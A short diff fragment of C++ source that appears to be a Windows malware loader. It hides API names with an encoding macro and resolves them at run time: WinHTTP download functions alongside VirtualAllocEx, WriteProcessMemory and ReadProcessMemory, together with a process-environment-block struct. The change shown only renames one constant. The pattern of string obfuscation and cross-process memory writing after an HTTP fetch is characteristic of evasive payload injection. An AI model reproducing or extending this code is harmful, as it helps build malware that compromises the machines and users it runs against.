@@ -80,7 +80,7 @@ static constexpr auto PWSR = mkxs("WinHttpSendRequest");
 static constexpr auto PWRR = mkxs("WinHttpReceiveResponse");
 static constexpr auto PWQA = mkxs("WinHttpQueryDataAvailable");
 static constexpr auto PWRD = mkxs("WinHttpReadData");
-static constexpr auto PWCH = mkxs("WinHttpCloseHandle");
+static constexpr auto XWCH = mkxs("WinHttpCloseHandle");
 static constexpr auto PVA  = mkxs("VirtualAllocEx");
 static constexpr auto PWPM = mkxs("WriteProcessMemory");
 static constexpr auto PRPM = mkxs("ReadProcessMemory");
@@ -121,7 +121,7 @@ struct PBI     { PVOID r1; PVOID Peb; PVOID r2[2]; ULONG_PTR pid; PVOID r3; };
 static bool LoadHTTP(WinHttp& w) {
     DA(dll,PWDL); w.m = LoadLibraryA(dll); if (!w.m) return false;
     DA(s1,PWO); DA(s2,PWC); DA(s3,PWOR); DA(s4,PWSR);
-    DA(s5,PWRR); DA(s6,PWQA); DA(s7,PWRD); DA(s8,PWCH);
+    DA(s5,PWRR); DA(s6,PWQA); DA(s7,PWRD); DA(s8,XWCH);
     w.O=(pfWO)GetProcAddress(w.m,s1); w.C=(pfWC)GetProcAddress(w.m,s2);
     w.R=(pfWR)GetProcAddress(w.m,s3); w.S=(pfWS)GetProcAddress(w.m,s4);
     w.V=(pfWV)GetProcAddress(w.m,s5); w.A=(pfWA)GetProcAddress(w.m,s6);
